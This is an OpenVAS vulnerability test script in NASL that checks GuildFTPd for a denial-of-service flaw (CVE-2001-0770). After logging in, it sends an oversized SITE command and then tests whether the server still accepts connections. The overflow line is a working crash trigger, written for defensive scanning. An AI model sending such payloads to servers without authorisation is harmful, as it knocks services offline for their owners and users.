# OpenVAS Vulnerability Test
# $Id: guildftpd_site_cmd_overflow.nasl 13613 2019-02-12 16:12:57Z cfischer $
# Description: GuildFTPd Long SITE Command Overflow
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: andreas.junestam@defcom.com

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15851");
  script_version("$Revision: 13613 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:12:57 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2782);
  script_cve_id("CVE-2001-0770");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("GuildFTPd Long SITE Command Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/guildftpd/detected");

  script_tag(name:"solution", value:"Upgrade or install another ftp server.");

  script_tag(name:"summary", value:"The remote FTP server seems to be vulnerable to denial service attack through
  the SITE command when handling specially long request.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if ( ! banner || "GuildFTP" >!< banner )
  exit(0);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];
if(login)
{
  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
    data = string("SITE ", crap(262), "\r\n");
    send(socket:soc, data:data);
    reply = ftp_recv_line(socket:soc);
    sleep(1);
    soc2 = open_sock_tcp(port);
    if(!soc2)
    {
      security_message(port);
    }
    close(soc2);
    data = string("QUIT\n");
    send(socket:soc, data:data);
  }
  close(soc);
}